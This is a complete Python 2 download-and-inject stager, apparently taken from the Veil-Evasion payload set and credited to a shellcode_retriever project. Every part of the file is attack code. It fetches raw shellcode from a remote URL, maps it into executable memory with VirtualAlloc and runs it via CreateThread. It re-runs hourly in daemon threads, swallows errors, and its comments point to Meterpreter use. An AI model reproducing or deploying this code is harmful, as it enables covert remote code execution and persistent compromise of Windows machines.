#!/usr/bin/env python2.7

'''
A threaded version of @midnite_runr's shellcode_retriver script (https://github.com/secretsquirrel/shellcode_retriever)

This payload is available in Veil-Evasion (https://github.com/Veil-Framework/Veil-Evasion/blob/master/modules/payloads/python/shellcode_inject/download_inject.py)

If injecting Meterpreter shellcode, remember to specify 'thread' as the EXITFUNC in the handler
'''

from threading import Thread
from urllib2 import build_opener
from ctypes import windll, c_int, c_char, pointer
from time import sleep

timesleep = 3600
shellcode_url = 'URL_GOES_HERE'
opener = build_opener()

def allocate_exe(shellcode):
    """ 
    ctypes VritualAlloc, MoveMem, and CreateThread 
    From http://www.debasish.in/2012_04_01_archive.html
    """
    ptr = windll.kernel32.VirtualAlloc(c_int(0),
                                       c_int(len(shellcode)),
                                       c_int(0x3000),
                                       c_int(0x40))
 
    buf = (c_char * len(shellcode)).from_buffer(shellcode)
 
    windll.kernel32.RtlMoveMemory(c_int(ptr),
                                  buf,
                                  c_int(len(shellcode)))
 
    ht = windll.kernel32.CreateThread(c_int(0),
                                      c_int(0),
                                      c_int(ptr),
                                      c_int(0),
                                      c_int(0),
                                      pointer(c_int(0)))
 
    windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))

def get_and_execute(url):
    info = opener.open(url)
    shellcode = info.read()
    shellcode = bytearray(shellcode)
    allocate_exe(shellcode)

def main():
    while True:
        try:
            t = Thread(name='get_and_execute', target=get_and_execute, args=(shellcode_url,))
            t.setDaemon(True)
            t.start()

            sleep(timesleep)
        except Exception:
            pass

if __name__ == "__main__":
    main()